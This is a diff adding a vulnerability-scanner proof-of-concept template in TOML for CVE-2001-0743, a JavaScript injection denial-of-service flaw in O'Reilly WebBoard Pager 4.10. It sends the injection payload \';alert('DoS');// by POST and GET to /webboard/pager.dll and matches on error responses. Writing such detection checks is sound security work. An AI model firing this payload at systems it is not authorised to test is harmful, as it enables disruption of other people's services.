@@ -1,0 +1,83 @@
+[info]
+author = "ave"
+description = "验证 O'Reilly WebBoard Pager 4.10 寻呼功能中的 JavaScript 注入拒绝服务漏洞，通过发送包含转义单引号和 JavaScript 代码的消息触发 DoS"
+id = "POC-AVE-2001-0326"
+name = "CVE-2001-0743 PoC"
+severity = "medium"
+tags = ["ave-2001-0326"]
+vuln_id = [
+    "CVE-2001-0743",
+    "AVE-2001-0326",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/webboard/pager.dll"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+action = "page"
+message = '''\';alert('DoS');//'''
+user = "testuser"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    500,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "exception",
+    "crash",
+    "JavaScript",
+    "script",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/webboard/pager.dll?action=page&user=testuser&message=%5C%27%3Balert(%27DoS%27)%3B%2F%2F"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    500,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "exception",
+    "crash",
+    "JavaScript",
+    "script",
+]
